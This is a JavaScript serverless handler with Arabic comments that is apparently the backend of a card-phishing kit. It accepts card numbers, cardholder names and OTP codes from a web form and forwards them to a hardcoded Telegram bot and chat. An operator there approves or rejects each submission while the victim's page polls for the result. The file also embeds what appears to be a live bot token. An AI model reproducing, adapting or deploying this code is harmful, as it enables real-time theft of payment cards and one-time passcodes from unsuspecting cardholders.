export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  const CHAT_ID = "8040433133";
  const method = req.method;
  const body = req.body || {};

  // 1. فحص الحالة بالاستعلام المباشر عن تفاعلات الأزرار من تليجرام
  if (method === 'GET') {
    const { user_id } = req.query;
    if (!user_id) return res.status(200).json({ status: 'pending' });

    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-40&allowed_updates=["callback_query"]`);
      const tgData = await tgRes.json();

      let status = 'pending';
      if (tgData.ok && tgData.result) {
        for (const update of tgData.result) {
          if (update.callback_query) {
            const data = update.callback_query.data;
            if (data === `approve_otp_${user_id}` || data === `approve_pay_${user_id}`) {
              status = 'approved';
              break;
            } else if (data === `reject_otp_${user_id}` || data === `reject_pay_${user_id}`) {
              status = 'rejected';
              break;
            }
          }
        }
      }
      return res.status(200).json({ status });
    } catch (e) {
      return res.status(200).json({ status: 'pending' });
    }
  }

  // 2. معالجة ضغطات الأزرار (Callback Query)
  if (body.callback_query) {
    const callback = body.callback_query;
    const chatId = callback.message.chat.id;
    const messageId = callback.message.message_id;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: callback.message.text + "\n\n✅ **[تمت الموافقة بنجاح]**",
        parse_mode: 'Markdown'
      })
    });

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: "تم تسجيل قرارك!" })
    });

    return res.status(200).json({ ok: true });
  }

  // 3. إرسال الطلب للبوت
  const text = body.رمز_التحقق_OTP 
    ? `🔐 *طلب رمز تحقق (OTP)*\n\n🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n💳 البطاقة: \`${body.رقم_البطاقة}\`\n👤 الاسم: ${body.اسم_الحامل}\n🆔 معرف المستخدم: \`${body.user_id}\``
    : `💳 *طلب بطاقة جديد*\n\n👤 الاسم: ${body.card_name}\n💳 الرقم: \`${body.card_number}\`\n🆔 معرف المستخدم: \`${body.user_id}\``;

  const actionType = body.رمز_التحقق_OTP ? 'otp' : 'pay';
  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_${actionType}_${body.user_id}` },
        { text: "❌ رفض", callback_data: `reject_${actionType}_${body.user_id}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'Markdown',
      reply_markup: keyboard
    })
  });

  return res.status(200).json({ ok: true });
}
